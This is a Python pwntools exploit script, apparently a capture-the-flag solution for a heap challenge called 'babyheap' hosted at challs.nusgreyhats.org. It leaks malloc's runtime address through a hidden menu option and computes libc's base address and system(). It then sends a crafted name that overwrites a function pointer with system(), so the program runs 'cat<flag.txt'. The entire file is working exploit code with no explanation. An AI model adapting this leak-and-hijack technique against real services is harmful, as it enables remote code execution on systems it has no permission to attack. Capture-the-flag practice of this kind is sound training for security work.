from pwn import *

context.binary = elf = ELF("./babyheap")
libc = ELF("./libc-docker.so.6")

p = remote("challs.nusgreyhats.org", 31367)

p.sendlineafter(b"3. Make greycat talk", b"6767")
p.recvline()
malloc_leak = p.recvline().strip()
print("Runtime malloc leak: " + str(malloc_leak))
malloc_leak = int(malloc_leak, 16)

libc_base = malloc_leak - libc.symbols["malloc"]
print("libc base:" + hex(libc_base))
system = libc_base + libc.symbols["system"]
print("system address: " + hex(system))
payload = b'cat<flag.txt\x00' + b"A" * 23 + p64(system)
p.sendlineafter(b"3. Make greycat talk", b"2")
p.sendlineafter(b"Enter greycat name:", payload)
p.sendlineafter(b"3. Make greycat talk", b"3")
p.sendlineafter(b"Greycat index:", b"0")
p.interactive()
